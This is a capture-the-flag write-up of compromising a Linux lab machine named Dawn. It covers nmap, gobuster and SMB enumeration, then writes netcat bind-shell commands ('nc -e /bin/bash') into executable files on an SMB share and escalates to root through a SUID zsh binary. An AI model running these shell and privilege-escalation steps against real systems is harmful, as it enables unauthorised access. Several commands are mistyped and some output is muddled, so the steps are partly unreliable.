---
title : Dwan Machine(Linux machine)
tags: [Secuirty, Machine, pentesting]
style: border
color: dark
description: pwn Dwan machine

---
# Dwan Machine 
Hi all Its an linux based machine , let get into it 

First we connet to the Network Using VPN 

## Checking connection 
>Ping 192.168.222.11 

The connected scuesfully to the network 

## Enumuration

>  **nmap -sV -A 192.168.222.11**


```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGRUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 25
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, InteractiveClient, ODBCClient, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YsX>j~\/sw$?PV?uPrm
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: DAWN

Host script results:
| smb2-time: 
|   date: 2023-08-09T16:05:31
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2023-08-09T12:05:32-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required 
```

Weee, *http* port is running let run ***gobuster***
>**gobuster  dir -u  http://192.168.222.11/ -w /home/harishankar/wordlist/ .txt**

**/logs/**  directory is available 
let look into it 

![Go busterscan](/posts/img/Dwan/Screenshot%20from%202023-08-09%2022-08-14.jpg)

![Logs](/posts/img/Dwan/Screenshot%20from%202023-08-09%2022-09-19.jpg)
    Log file exposed 

In that we can see that a file has excution permision **web-Control**  and **product-Control** with so let see on other side smbclient 
Doing more enumeration


****Enum4Linux****  
It Finds that smb runs with shared **ITDEPT** work Grp 
let connet through smbclient
 >smbclient //192.168.222.11/ITDEPT
 
 ![smbclient](/posts/img/Dwan/Screenshot%20from%202023-08-09%2022-12-56.png) 

## Intial Access 
 um empty , we know that product-control and web-control file with execution 

 let add file into this 
 ```
 echo "nc-e /bin/bash/-lvp 1234&" > product-control

 echo "nc-e /bin/bash/ -lvp 1235&" > web-control
``````

Puting the file into the machine now we essatblish the connetion 
``` 

NC 192.168.222.11 1234 

```
## privilege escalation

 SUID — It will provide special type of file permissions given to file. So If I’m an attacker once I got reverse first thing I will check SUID related files.

 ```
find / -perm -u=s -type f 2>/dev/null 
 
$whoami

$/usr/bin/zsh
 
$whoami
/root
/dawn

$cd /root
$cat flag.txt 

``` 

